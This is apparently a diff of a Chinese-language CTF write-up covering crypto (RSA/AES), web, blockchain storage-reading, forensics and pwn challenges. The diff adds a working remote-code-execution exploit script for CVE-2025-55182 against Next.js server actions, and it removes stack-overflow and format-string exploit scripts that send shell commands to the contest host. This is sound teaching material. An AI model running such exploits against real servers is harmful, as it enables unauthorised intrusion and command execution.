+# key = 8c0c5db5efdd4505b1cd88569b6bf8f5
+# IV  = 6144s1oo1s1p7osq442p6qsr5733701p
+# ciphertext = 0ffb5c8356bf6a0ea8e541fbc7f27aa00095f302dbc27b7e4842a500cfd9767b16c9fc8f7a8d420e8bd604b727a363fb
+```
+
+观察整个加密流程，应该是
+```
+flag -> RSA -> c_rsa -> 转bytes -> AES-CBC -> ciphertext
+```
+那么倒着来即可得到flag
+
+先AES解密：
+
+题目给了：
+```
+key = 8c0c5db5efdd4505b1cd88569b6bf8f5
+IV  = 6144s1oo1s1p7osq442p6qsr5733701p
+```
+这里IV有混淆，题目给了`caesar_13_iv`,于是使用 ROT13对字母做偏移
+```
+a <-> n
+b <-> o
+c <-> p
+d <-> q
+e <-> r
+f <-> s
+```
+
+然后到RSA解密：
+
+题目给了n，且p,q只有128bit
+
+所以能很快分解出p,q:
+```
+p = 319604865451981917438227037590936720137
+q = 339357623313190301253627442856667763273
+```
+
+然后按RSA解密流程就能得到flag了。
+
+破译脚本：
+```python
+import codecs
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+from Crypto.Util.number import long_to_bytes
+
+n = 108460347539116548233850259329362939266582518558734624388997849930646568128401
+e = 65537
+
+key_hex = "8c0c5db5efdd4505b1cd88569b6bf8f5"
+iv_obf = "6144s1oo1s1p7osq442p6qsr5733701p"
+ct_hex = "0ffb5c8356bf6a0ea8e541fbc7f27aa00095f302dbc27b7e4842a500cfd9767b16c9fc8f7a8d420e8bd604b727a363fb"
+
+# 1. ROT13 还原 IV
+iv_hex = codecs.decode(iv_obf, "rot_13")
+print("[+] iv_hex =", iv_hex)
+
+key = bytes.fromhex(key_hex)
+iv = bytes.fromhex(iv_hex)
+ct = bytes.fromhex(ct_hex)
+
+# 2. AES-CBC 解密
+cipher = AES.new(key, AES.MODE_CBC, iv)
+c_rsa_bytes = unpad(cipher.decrypt(ct), 16)
+c_rsa = int.from_bytes(c_rsa_bytes, "big")
+
+print("[+] c_rsa_bytes =", c_rsa_bytes.hex())
+print("[+] c_rsa =", c_rsa)
+
+# 3. 填入分解出的 p, q
+p = 319604865451981917438227037590936720137
+q = 339357623313190301253627442856667763273
+
+if p and q:
+    phi = (p - 1) * (q - 1)
+    d = pow(e, -1, phi)
+
+    m = pow(c_rsa, d, n)
+    flag = long_to_bytes(m)
+
+    print("[+] flag =", flag)
+else:
+    print("[!] 先分解 n，得到 p 和 q 后填入脚本。")
+```
+
+flag:
+![flag](./crypto/double-crypto/flag.png)
+```
+flag{crypto_1s_fun}
+```
+
+
+## Web
+
+### Hidden Secret
 
 题目：
 
@@ -376,7 +2583,129 @@ curl.exe -i https://bili33.top/fLaG-15-hERe_lol
 flag{weIC0Me_to-gDUTcscTf-ZOZ6_ENjoy-THE_gaME}
 ```
 
-## WEBWEBWEB
+### CVE-2025-55182
+
+这里先查询了相关漏洞信息：[CVE-2025-55182的原理与复现](https://www.cnblogs.com/hzhsec/p/19412603)，然后明确最终目的：在远程靶机上实现命令执行。
+
+首先用浏览器和curl访问靶机
+
+![curl](./web/CVE/web_code.png)
+
+![web](./web/CVE/boundary.png)
+
+其中浏览器中有提示：尝试从.Git目录泄露的数据中查找信息
+
+根据漏洞信息写脚本：
+```python
+#!/usr/bin/env python3
+import base64
+import json
+import re
+import sys
+from urllib.parse import unquote
+
+import requests
+
+
+BOUNDARY = "----ofofwawaofofjijihghgnbBNgVqwwn3wzu78"
+
+
+def make_body(fields):
+    body = b""
+    for name, value in fields.items():
+        body += f"--{BOUNDARY}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
+        body += value.encode()
+        body += b"\r\n"
+    body += f"--{BOUNDARY}--\r\n".encode()
+    return body
+
+
+def build_body(cmd: str):
+    js_cmd = json.dumps(cmd)
+
+    prefix = (
+        "var cp=process.mainModule.require('child_process');"
+        f"var res=cp.execSync({js_cmd},{{timeout:8000}}).toString();"
+        "var b=Buffer.from(res).toString('base64');"
+        "throw Object.assign(new Error('NEXT_REDIRECT'),"
+        "{digest:'NEXT_REDIRECT;push;/x?o='+b+';307;'});"
+    )
+
+    chunk = {
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": "{\"then\":\"$B1337\"}",
+        "_response": {
+            "_prefix": prefix,
+            "_formData": {
+                "get": "$1:constructor:constructor"
+            }
+        }
+    }
+
+    fields = {
+        "0": json.dumps(chunk, separators=(",", ":")),
+        "1": "\"$@0\"",
+    }
+
+    return make_body(fields)
+
+
+def decode_output(resp):
+    data = "\n".join([
+        resp.headers.get("X-Action-Redirect", ""),
+        resp.headers.get("Location", ""),
+        resp.text,
+    ])
+
+    m = re.search(r"[?&]o=([^;\s\"'<>]+)", data)
+    if m:
+        raw = unquote(m.group(1))
+        return base64.b64decode(raw + "=" * (-len(raw) % 4)).decode("utf-8", "replace")
+
+    return data[:3000]
+
+
+def run(base_url, cmd):
+    url = base_url.rstrip("/") + "/"
+    body = build_body(cmd)
+
+    r = requests.post(
+        url,
+        headers={
+            "User-Agent": "Mozilla/5.0",
+            "Next-Action": "x",
+            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
+        },
+        data=body,
+        timeout=15,
+        allow_redirects=False,
+    )
+
+    print("[status]", r.status_code)
+    print(decode_output(r))
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f'Usage: {sys.argv[0]} http://host:port "id"')
+        sys.exit(1)
+
+    run(sys.argv[1], " ".join(sys.argv[2:]))
+```
+
+可以看到拿到了root权限了：
+![root](./web/CVE/root.png)
+
+然后继续查找flag并读取
+![flag](./web/CVE/flag.png)
+
+
+## Blockchain
+
+### WEBWEBWEB
 
 获取到靶机地址后尝试curl,获得了以下内容：
 ```
@@ -393,9 +2722,11 @@ flag{weIC0Me_to-gDUTcscTf-ZOZ6_ENjoy-THE_gaME}
 
 区块链是一个常人都不怎么接触的东西，所以本题的解题极大依赖 ChatGPT 了，但是不妨来学一下相关内容：
 
+<folder style="3">
+
 这里我先去看了**3B1B**的视频[【官方双语】想知道比特币（和其他加密货币）的原理吗？](https://www.bilibili.com/video/BV11x411i72w/?spm_id_from=333.337.search-card.all.click&vd_source=9a12fa4360c14cdf5412031aa7c3d044)，了解了加密货币的原理。
 
-回到题目，GPT指出:
+将curl出的json文件扔给GPT，GPT指出:
 ```
 address <=> 钱包地址，也叫EOA（Externally Owned Account）
 privateKey <=> 控制该钱包的私钥
@@ -404,7 +2735,7 @@ fundingAmountWei <=> 换算1 ETH，这是题目给的启动资金
 chainId <=> 本地链
 ```
 
-先说合约：
+#### 先说合约：
 
 所谓合约，其实是一种代码，如：
 ```
@@ -465,7 +2796,7 @@ function isSolved() public view returns(bool){
 }
 ```
 
-再说区块链（存储与访问层面）：
+#### 再说区块链（存储与访问层面）：
 
 ChatGPT指出：
 
@@ -545,31 +2876,8 @@ r = requests.post(RPC,json=payload)
 print(r.json())
 ```
 
-本题的本质只有一句话：
-> 开发者把秘密存进了一个全世界都能读取的公开数据库(区块链)，然后误以为 private 能隐藏它；而你只是按照区块链规则把它读了出来。
+#### 对于数据存储，我查了一下资料：
 
-从攻击视角来看，甚至没有"攻击"任何东西,因为：
-```
-区块链 = 公开数据库
-私钥 = 修改权限
-storage = 数据库存储区
-private ≠ 保密
-```
-
-我们需要尝试读取区块链数据：
-
-题目已经给出challenge地址，所以利用
-```python
-eth_getStorageAt(
-    chalAddress,
-    0
-)
-```
-读取到了 slot 0，结果是 0x55 = 85 = 42 * 2 + 1
-
-（吐槽ChatGPT的一段原话：大家都会想到：42来自《银河系漫游指南》。The Hitchhiker's Guide to the Galaxy）我就问，谁想得到。
-
-对于数据存储，我查了一下资料：
 
 经典以太坊区块结构图：
 ```
@@ -658,8 +2966,6 @@ Contract
 
 所以要区分开：Block记录操作日志，Storage保存合约状态
 
-回到题目，我们已经知道了Contract中slot0中有42这个提示了，也就是告诉我们要利用slot0的地址+合约地址查询slot0所映射的大数据块。
-
 也就是定位一个数据需要：
 ```
 (合约地址, slot编号)
@@ -669,6 +2975,35 @@ eth_getStorageAt(
     slot
 )
 ```
+
+</folder>
+
+本题的解题思路可以概括为：
+> 开发者把秘密存进了一个全世界都能读取的公开数据库(区块链)，然后误以为 private 能隐藏它；而我们只是按照区块链规则把它读了出来。
+
+从攻击视角来看，甚至没有"攻击"任何东西,因为：
+```
+区块链 = 公开数据库
+私钥 = 修改权限
+storage = 数据库存储区
+private ≠ 保密
+```
+
+那只要尝试读取区块链数据就可以找到flag了：
+
+题目已经给出challenge地址，所以利用
+```python
+eth_getStorageAt(
+    chalAddress,
+    0
+)
+```
+读取到了 slot 0，结果是 0x55 = 85 = 42 * 2 + 1，这和区块链存储有关
+
+（吐槽ChatGPT的一段原话：大家都会想到：42来自《银河系漫游指南》。The Hitchhiker's Guide to the Galaxy）我就问，谁想得到。
+
+那此时利用slot0的地址+合约地址查询slot0所映射的数据块即可得到flag
+
 因为flag位于slot 0
 
 其真实位置 = keccak256(0)开始的位置
@@ -736,359 +3071,9 @@ else:
 
 <line>
 
-## ezstack
+## Forensics
 
-使用 IDA 打开程序，Shift + F12 搜字符串套转到主逻辑函数部分：
-
-![函数主逻辑部分](./pwm/ezstack/ida_main.png)
-
-这里看到ReadingBuffer的大小只有112，没有做防溢出保护
-
-然后程序为64位程序
-
-![64位程序](./pwm/ezstack/64.png)
-
-所以我们构造一个这样的栈布局实现入侵：
-
-<padding expand="16">
-
-![evil的地址](/assets/local-svg/ezstack.drawio.p16.svg)
-
-</padding>
-
-即通过写入112个A字符写到[rbp+0]的位置，然后在[rbp+8]的位置放入一个任意地址的retn指令实现linux 64位程序所需要的16位对齐，再在[rbp+16]的位置放入evil函数的地址即可完成栈溢出攻击。
-
-再查询evil的地址：
-
-![evil的地址](./pwm/ezstack/400507.png)
-
-于是有了以下代码：
-```python
-import socket
-import struct
-import time
-
-HOST = "ctf-2.xeed.run"
-PORT = 30832
-
-def p64(x):
-    return struct.pack("<Q", x)
-
-ret = 0x400506
-evil = 0x400507
-
-payload = b"A" * 120
-payload += p64(ret)
-payload += p64(evil)
-
-s = socket.create_connection((HOST, PORT))
-s.settimeout(2)
-
-# 接收题目提示
-try:
-    data = s.recv(4096)
-    print(data.decode(errors="ignore"), end="")
-except:
-    pass
-
-# 发送溢出 payload
-s.sendall(payload + b"\n")
-
-time.sleep(0.2)
-
-# 给 shell 发命令
-cmds = [
-    b"id\n",
-    b"pwd\n",
-    b"ls -la\n",
-    b"cat flag 2>/dev/null\n",
-    b"cat flag.txt 2>/dev/null\n",
-    b"cat /flag 2>/dev/null\n",
-    b"cat /flag.txt 2>/dev/null\n",
-    b"find / -name '*flag*' 2>/dev/null\n",
-]
-
-for cmd in cmds:
-    s.sendall(cmd)
-    time.sleep(0.1)
-
-# 持续接收输出
-while True:
-    try:
-        data = s.recv(4096)
-        if not data:
-            break
-        print(data.decode(errors="ignore"), end="")
-    except socket.timeout:
-        break
-```
-
-flag截图：
-
-![flag](./pwm/ezstack/ezstack_flag.png)
-
-
-## ezstring
-
-本题的漏洞是格式化字符串漏洞
-
-![flag](./pwm/ezstring/main.png)
-
-思路就是：只要合理的控制字符串的输出，就可以利用%n对check修改数据，实现进入win函数的目的。
-
-题目给的值是 0xdeadbeef,由于一次性输出0xdeedbeef的字符过大
-可以分两段输入给check ==> 0xdead 0xbeef
-
-因为程序是小端序，所以低位在低地址，高位在高地址，因此需要：
-
-[check + 0] 写入 0xbeef
-[check + 2] 写入 0xdead
-
-这里附上check的地址
-![check的地址](./pwm/ezstring/check地址.png)
-
-第一段
-
-%1$0xbeefc ==> %1$48879c
-
-第二段
-
-%1$(0xdead-0xbeef)c ==> %1$(57005-48879)c ==> %1$8126c
-
-结合在一起就是
-
-%1$48879c%1$8126c
-
-此时我们还需要伪造参数并写入数据
-
-即%1$48879c + {%参数1的位置$hn} + %1$8126c + {%参数2的位置$hn}
-
-我们还需定位printf参数的位置。一般字符串不长，我们估计参数也就两位数，先不如写成：
-
-%1$48879c + {%xx$hn} + %1$8126c + {%xx的位置$hn}
-
-%1$48879c%xx$hn%1$8126c%xx$hn
-
-共计29字节，
-
-在 64 位 Linux 程序中，前几个参数会优先通过寄存器传递，而本题测试发现，buf + 0x00 对应 printf 的第 6 个参数。由于 64 位地址占 8 字节，因此后续每 8 字节对应一个参数位置：
-
-buf + 0x00	→	第 6 个参数
-buf + 0x08	→	第 7 个参数
-buf + 0x10	→	第 8 个参数
-buf + 0x18	→	第 9 个参数
-buf + 0x20	→	第 10 个参数
-buf + 0x28	→	第 11 个参数
-
-于是向上补齐到32字节，此时[buf + 0]to[buf + 31] 为格式化字符串，占用了参数6to参数9的位置
-
-于是我们只需再加两个参数10,11用于存放[check + 0]和[check + 2]的地址
-
-于是得到
-%1$48879c%10$hn%1$8126c%11$hnAAA + p64(0x4040cc) + p64(0x4040ce)
-
-
-所以有了以下代码：
-```python
-import socket
-import struct
-import re
-
-HOST = "ctf-2.xeed.run"
-PORT = 31756
-
-def p64(x):
-    return struct.pack("<Q", x)
-
-check = 0x4040cc
-
-fmt = b"%1$48879c%10$hn%1$8126c%11$hn"
-
-payload = fmt
-payload += b"A" * (32 - len(payload))
-payload += p64(check)
-payload += p64(check + 2)
-
-print("[+] payload length:", len(payload))
-
-s = socket.create_connection((HOST, PORT), timeout=8)
-
-banner = s.recv(4096)
-print(banner.decode(errors="ignore"))
-
-s.sendall(payload + b"\n")
-
-data = b""
-s.settimeout(5)
-
-while True:
-    try:
-        chunk = s.recv(4096)
-        if not chunk:
-            break
-        data += chunk
-    except socket.timeout:
-        break
-
-m = re.search(rb"(flag\{[^}]+\}|A1CTF\{[^}]+\})", data)
-if m:
-    print("[+] FLAG:", m.group(1).decode())
-else:
-    print(data[-3000:].decode(errors="ignore"))
-```
-
-flag:
-![flag](./pwm/ezstring/flag.png)
-
-
-## baseh
-
-本题的思路：
-
-这里是主逻辑函数：
-
-![主逻辑函数](./pwm/baseh/main.png)
-
-这里粗略看了一下输入，没发现问题，然后绕了一圈定位到了auth函数
-
-![auth函数](./pwm/baseh/bug.png)
-
-这里发现auth函数中局部变量v4有漏洞：
-
-![漏洞原理](./pwm/baseh/baseh.svg)
-
-于是可以通过修改auth函数要返回的ebp，让auth函数返回时，ebp跳转到input的地址上。
-
-然后在input上构造这样的假栈：
-
-![input上的假栈](./pwm/baseh/baseh_input.drawio.svg)
-
-即可让程序在main执行ret后，让esp指向input假栈中的correct地址，从而让eip跳转correct，即执行correct函数
-
-代码：
-```python
-import socket
-import struct
-import base64
-import time
-
-HOST = "ctf-2.xeed.run"
-PORT = 31679
-
-def p32(x):
-    return struct.pack("<I", x)
-
-correct = 0x0804925f
-bss_buf = 0x0811eb40
-
-raw = p32(0xdeadbeef)
-raw += p32(correct)
-raw += p32(bss_buf)
-
-payload = base64.b64encode(raw)
-
-print("[+] raw payload:", raw.hex())
-print("[+] base64 payload:", payload.decode())
-
-s = socket.create_connection((HOST, PORT), timeout=8)
-
-data = s.recv(4096)
-print(data.decode(errors="ignore"))
-
-s.sendall(payload + b"\n")
-
-time.sleep(0.5)
-
-# 拿到 shell 后尝试读 flag
-s.sendall(b"cat /flag 2>/dev/null; cat flag* 2>/dev/null\n")
-
-time.sleep(0.5)
-
-try:
-    while True:
-        data = s.recv(4094096)
-        if not data:
-            break
-        print(data.decode(errors="ignore"), end="")
-except:
-    pass
-```
-
-![flag](./pwm/baseh/flag.png)
-
-## nopnopnop
-
-这一题也是栈溢出，程序会输出Target,解析后向Buffer输入字符覆盖返回地址跳转即可，代码如下：
-
-代码：
-```python
-import socket
-import struct
-import re
-import time
-
-HOST = "ctf-2.xeed.run"
-PORT = 30087
-
-offset = 0x108
-
-def recv_until(s, mark=b">"):
-    data = b""
-    while mark not in data:
-        chunk = s.recv(1)
-        if not chunk:
-            break
-        data += chunk
-    return data
-
-s = socket.create_connection((HOST, PORT), timeout=10)
-s.settimeout(8)
-s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-
-banner = recv_until(s, b">")
-print(banner.decode(errors="ignore"), end="")
-
-m = re.search(rb"Target:\s*(0x[0-9a-fA-F]+)", banner)
-if not m:
-    print("\n[-] 没找到 Target")
-    exit()
-
-target = int(m.group(1), 16)
-ret_gadget = target - 1   # 0x40127a: ret
-
-print(f"\n[+] target     = {hex(target)}")
-print(f"[+] ret gadget = {hex(ret_gadget)}")
-
-payload = b"A" * offset
-payload += struct.pack("<Q", ret_gadget)
-payload += struct.pack("<Q", target)
-payload += b"\n"
-
-print(f"[+] payload length = {len(payload)}")
-print("[+] sending aligned ret2win payload...")
-
-s.sendall(payload)
-
-# 不要 shutdown
-time.sleep(0.5)
-
-out = b""
-while True:
-    try:
-        chunk = s.recv(4096)
-        if not chunk:
-            break
-        out += chunk
-    except socket.timeout:
-        break
-
-print(out.decode(errors="ignore"), end="")
-s.close()
-```
-
-![flag](./pwm/nopnopnop/flag.png)
-
-## Secret in Chatting
+### Secret in Chatting
 
 通过查询Minecraft的服务器端口，使用过滤器：
 ```
@@ -1862,1750 +3847,49 @@ hex : 47394d4b356d44494d4e547875536c553531365858516a35347770654e52586f666b394b6b
 
 对话中提到了 `Atom` 表，查询资料后可以知道，这里指的是一种 Base64 换表编码。也就是说，它本质上仍然是 Base64，只是使用的字符表不是标准 Base64 表。
 
-常见的 Atom128 表如下：
+搜到的 Atom128 表如下：
 
 ```python
 ATOM = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"
 STD  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
 ```
 
-## nyah
+然后利用base58对key编码，用Atom128对iv换表编码，最后的密文用base64编码
 
-查看主逻辑函数：
-
-![主逻辑函数](./reverse/nyah/主逻辑函数.png)
-
-每一个函数及其操作我写在了注释中
-
-这里是两个比较重要的函数：
-
-一个洗牌函数：
-![洗牌函数](./reverse/nyah/洗牌函数.png)
-
-一个加密函数：
-![加密](./reverse/nyah/加密.png)
-
-整个加密流程可以概括为：
-```
-程序先生成了一个表v5(我命名为table了)，并使用delta_time对table洗牌
-
-然后函数sub_1400015FD会将密文串和table做异或加密。
-```
-
-再根据delta_time应该为259200,便有了以下解密脚本：
+得到脚本：
 ```python
-cipher = bytes.fromhex(
-    "61 6e 64 cd 7f 68 c1 e6"
-    "3f a3 9d f9 7c 3f c6 a1"
-    "ec db 7b 2f 7e 7f 69 29"
-    "ee 9f be 54 6e 69 60 12"
-)
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 
-def shuffle_table(seed):
-    s = list(range(256))
+key_s = "9oRMfzcUbDhJUzfayDmLbD"
+iv_s = "HGX1f59FHHcbfGhLDguoPbCC"
+ct_s = "G9MK5mDIMNTxuSlU516XXQj54wpeNRXofk9KkIow9Po="
 
-    for i in range(0, 256, 8):
-        v5 = 0
+def b58decode(s):
+    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+    n = 0
+    for c in s:
+        n = n * 58 + alphabet.index(c)
+    return n.to_bytes((n.bit_length() + 7) // 8, "big")
 
-        for j in range(8):
-            v5 = (v5 << 8) + s[i + j]
+def atom128_decode(s):
+    std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+    atom = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"
+    return base64.b64decode(s.translate(str.maketrans(atom, std)))
 
-        seed ^= v5
-        seed &= 0xffffffffffffffff
+key = b58decode(key_s)
+iv = atom128_decode(iv_s)
+ct = base64.b64decode(ct_s)
 
-        for k in range(8):
-            v4 = (seed >> (8 * k)) & 0xff
-            s[i + k], s[v4] = s[v4], s[i + k]
+cipher = AES.new(key, AES.MODE_CBC, iv)
+flag = unpad(cipher.decrypt(ct), 16)
 
-    return s
-
-seed = 259200
-s = shuffle_table(seed)
-
-plain = bytes(c ^ s[i] for i, c in enumerate(cipher))
-print(plain)
-print(plain.rstrip(b"\x00").decode())
+print(flag.decode())
 ```
 
-flag:
-![flag](./reverse/nyah/flag.png)
-
-## Assembly_recovery
-
-文件打开就吓哭了，全是汇编了......
-
-```asm
-; ============================================================================
-; A suspicious DOS program was recovered from a 1990s BBS archive.
-; The code is full of nonsensical instructions and dead ends —
-; clearly someone tried to hide something inside. find it.
-; ============================================================================
-
-    BITS  16
-    ORG   100h
-
-off_0100:
-    push    cs
-    pop     ds
-    push    cs
-    pop     es
-
-    mov     ax, 0x1337
-    mov     bx, 0x0DEF
-    mov     cx, 0xBEEF
-    mov     dx, 0xC0DE
-    mul     cx
-    add     ax, bx
-    ror     ax, 4
-    xor     ah, 0xAB
-    xor     ax, ax
-    xor     bx, bx
-    xor     cx, cx
-    xor     dx, dx
-
-    mov     al, 0x37
-
-    xchg    ax, cx
-    xchg    ax, cx
-
-    add     al, 0x13
-
-    cmp     bx, 0
-    je      .L1
-    mov     al, 0xFF
-.L1:
-
-    push    ax
-    pushf
-    pop     ax
-    pop     ax
-
-    stc
-    clc
-
-    xor     al, 0x1F
-
-    mov     bl, al
-
-    mov     al, 0xAA
-    shr     al, 1
-    xor     al, al
-
-    mov     cx, 0x100
-    shl     cx, 4
-    xor     cx, cx
-
-    mov     ax, off_063B
-    push    ax
-    ret
-
-off_015B:
-        db 0x24, 0x32, 0x22, 0x76, 0x5B, 0x56, 0x44, 0x5C
-        db 0x53, 0x51, 0x5D, 0x5C, 0x40, 0x52, 0x45, 0x46
-        db 0x42, 0x5E, 0x58, 0x47, 0x5B, 0x5C, 0x5D, 0x5F
-        db 0x50, 0x51, 0x53, 0x44, 0x56, 0x4D, 0x4F, 0x54
-
-off_017B:
-        db 0x74, 0x71, 0x6D, 0x66, 0x72, 0x6E, 0x63, 0x17, 0x0C, 0x78, 0x6F, 0x6A
-        db 0x7D, 0x45, 0x53, 0x35, 0x40, 0x56, 0x40, 0x5C, 0x59, 0x51, 0x5F, 0x51
-        db 0x3C, 0x6D, 0x29, 0x37, 0x2A, 0x27, 0x2E, 0x46, 0x2D, 0x23, 0x33, 0x38
-        db 0x38, 0x38, 0x47, 0x43, 0x45, 0x5F, 0x43, 0x48, 0x44, 0x3E, 0x2C, 0x3C
-
-    pop     bx
-    pop     cx
-    pop     dx
-    xchg    ax, dx
-    xchg    bx, cx
-    add     ax, 0x1111
-    sub     bx, 0x2222
-    xor     cx, 0x3333
-    and     dx, 0x0F0F
-    push    ax
-    push    bx
-    mov     ax, 0x0000
-    mov     bx, 0x0000
-    pop     bx
-    pop     ax
-    xor     ax, ax
-    xor     bx, bx
-    xor     cx, cx
-    xor     dx, dx
-
-off_01CE:
-        db 0x62, 0x44, 0x52, 0x45, 0x17, 0x76, 0x54, 0x54
-        db 0x52, 0x44, 0x44, 0x17, 0x7B, 0x52, 0x41, 0x52
-        db 0x5B, 0x0D, 0x17, 0x64, 0x6E, 0x64, 0x63, 0x72
-        db 0x7A, 0x37, 0x72, 0x59, 0x43, 0x52, 0x45, 0x17
-        db 0x67, 0x56, 0x44, 0x44, 0x40, 0x58, 0x45, 0x53
-    jmp     .skip_msg
-        db 0x0D, 0x17, 0x37
-.skip_msg:
-
-off_01FD:
-    mov     cx, 0x0020
-    mov     si, off_01CE
-.xor_loop:
-    lodsb
-    xor     al, cl
-    stosb
-    loop    .xor_loop
-    xor     si, si
-    xor     di, di
-    xor     cx, cx
-    jmp     .skip_dead
-    mov     ax, 0xB800
-    mov     es, ax
-    xor     di, di
-    mov     cx, 0x07D0
-    rep     stosw
-.skip_dead:
-
-off_0221:
-    times 6 db 0x7A, 0x6D, 0xA7, 0x37, 0x34, 0x37, 0x37, 0x37
-
-off_0251:
-    times 6 db 0x19, 0x24, 0x00, 0x75, 0x62, 0x51, 0x3D, 0x37, 0xC8
-
-off_0287:
-    times 6 db 0x24, 0x00, 0x75, 0x62, 0x51, 0xE9, 0x9A, 0x89, 0xD8, 0xFD, 0xC9, 0x8D
-
-off_02CF:
-    times 14 db 0x04, 0x0D, 0x01, 0x08, 0x15, 0x55, 0x5C, 0x53, 0x5C, 0x36
-
-off_035B:
-        db 0x76, 0x54, 0x54, 0x52, 0x44, 0x44, 0x17, 0x70
-        db 0x45, 0x56, 0x59, 0x43, 0x52, 0x53, 0x19, 0x17
-        db 0x60, 0x52, 0x5B, 0x54, 0x58, 0x5A, 0x52, 0x1B
-        db 0x17, 0x76, 0x53, 0x5A, 0x5E, 0x59, 0x5E, 0x44
-        db 0x43, 0x45, 0x56, 0x43, 0x58, 0x45, 0x16, 0x37
-
-off_0383:
-    mov     ah, 0x0E
-    mov     al, '>'
-    int     0x10
-    mov     al, ' '
-    int     0x10
-    mov     si, off_017B
-    mov     cx, 0x0010
-.type:
-    lodsb
-    int     0x10
-    push    cx
-    mov     cx, 0x0040
-.wait:
-    loop    .wait
-    pop     cx
-    loop    .type
-    xor     cx, cx
-    xor     ax, ax
-    xor     si, si
-
-off_03A9:
-    mov     ax, 0xDEAD
-    mov     bx, 0xBABE
-    mul     bx
-    rcl     ax, 1
-    xor     ax, 0xFFFF
-    xor     ax, ax
-    xor     bx, bx
-
-off_03BA:
-    times 8 db 0xDF, 0x34, 0x37, 0xDC, 0x36, 0xA7
-
-off_03EA:
-    mov     si, off_0221
-    mov     cx, 0x0030
-    mov     dx, 0xFFFF
-.crc:
-    lodsb
-    xor     dh, al
-    mov     bx, 0x0008
-.bit:
-    shr     dx, 1
-    jnc     .noxy
-    xor     dx, 0xA001
-.noxy:
-    dec     bx
-    jnz     .bit
-    loop    .crc
-    cmp     dx, 0x1D0F
-    je      .ok
-    mov     ax, 0x0001
-    jmp     .done_crc
-.ok:
-    xor     ax, ax
-.done_crc:
-    xor     si, si
-    xor     cx, cx
-    xor     dx, dx
-    xor     bx, bx
-
-off_0424:
-        db 0x7E, 0x79, 0x61, 0x76, 0x7B, 0x7E, 0x73, 0x17, 0x67, 0x76, 0x64, 0x64
-        db 0x60, 0x78, 0x65, 0x73
-        db 0x76, 0x74, 0x74, 0x72, 0x64, 0x64, 0x17, 0x73, 0x72, 0x79, 0x7E, 0x72
-        db 0x73
-        db 0x64, 0x6E, 0x64, 0x63, 0x72, 0x7A, 0x17, 0x7F, 0x76, 0x7B, 0x63, 0x72
-        db 0x73
-        db 0x74, 0x7F, 0x72, 0x74, 0x7C, 0x64, 0x62, 0x7A, 0x17, 0x71, 0x76, 0x7E
-        db 0x7B, 0x62, 0x65, 0x72
-        db 0x73, 0x72, 0x74, 0x65, 0x6E, 0x67, 0x63, 0x7E, 0x78, 0x79, 0x17, 0x72
-        db 0x65, 0x65, 0x78, 0x65
-        db 0x64, 0x72, 0x70, 0x7A, 0x72, 0x79, 0x63, 0x17, 0x71, 0x76, 0x62, 0x7B
-        db 0x63
-
-off_047B:
-    times 24 db 0xA7
-
-off_0493:
-    times 8 db 0x24, 0x00, 0x75, 0x62, 0x51, 0x40, 0xBF, 0xAE, 0x9D, 0x8C, 0xFB, 0xEA, 0xD9, 0xC8, 0x37, 0x26
-
-off_0513:
-    times 40 db 0xDC, 0xC9
-
-off_0563:
-        db 0x63, 0x7F, 0x7E, 0x64, 0x17, 0x7E, 0x64, 0x17, 0x76, 0x17, 0x73, 0x72
-        db 0x74, 0x78, 0x6E, 0x17, 0x1A, 0x17, 0x63, 0x7F, 0x72, 0x17, 0x71, 0x7B
-        db 0x76, 0x70, 0x17, 0x7E, 0x64, 0x17, 0x72, 0x7B, 0x64, 0x72, 0x60, 0x7F
-        db 0x72, 0x65, 0x72, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
-        db 0x79, 0x78, 0x63, 0x7F, 0x7E, 0x79, 0x70, 0x17, 0x63, 0x78, 0x17, 0x64
-        db 0x72, 0x72, 0x17, 0x7F, 0x72, 0x65, 0x72, 0x17, 0x1A, 0x17, 0x7A, 0x78
-        db 0x61, 0x72, 0x17, 0x76, 0x7B, 0x78, 0x79, 0x70, 0x17, 0x17, 0x17, 0x17
-        db 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
-        db 0x7C, 0x72, 0x72, 0x67, 0x17, 0x73, 0x7E, 0x70, 0x70, 0x7E, 0x79, 0x70
-        db 0x17, 0x6E, 0x78, 0x62, 0x17, 0x76, 0x65, 0x72, 0x17, 0x74, 0x7B, 0x78
-        db 0x64, 0x72, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
-        db 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
-
-off_05EF:
-        db 0x73, 0x72, 0x74, 0x78, 0x6E, 0x68, 0x64, 0x63, 0x65, 0x7E, 0x79, 0x70
-        db 0x68, 0x06, 0x05, 0x04, 0x03, 0x02, 0x68
-
-off_063B:
-    mov     si, off_06AB
-    mov     di, off_06CF
-    mov     cx, flag_len
-
-    push    bx
-    push    ax
-    pop     bx
-    pop     ax
-    xchg    ax, bx
-
-.decode_loop:
-    lodsb
-
-    push    ax
-    pop     ax
-
-    xor     al, bl
-    stosb
-
-    inc     bl
-
-    cmp     ax, 0
-    lahf
-    sahf
-
-    loop    .decode_loop
-
-    mov     si, off_06CF
-    mov     cx, flag_real_len
-    xor     al, al
-
-.verify_loop:
-    xor     al, [si]
-    inc     si
-    loop    .verify_loop
-
-    cmp     al, [si]
-    je      .valid
-
-    mov     ah, 0x09
-    mov     dx, off_0688
-    int     0x21
-    jmp     .exit
-
-.valid:
-    mov     byte [off_06CF + flag_real_len], '$'
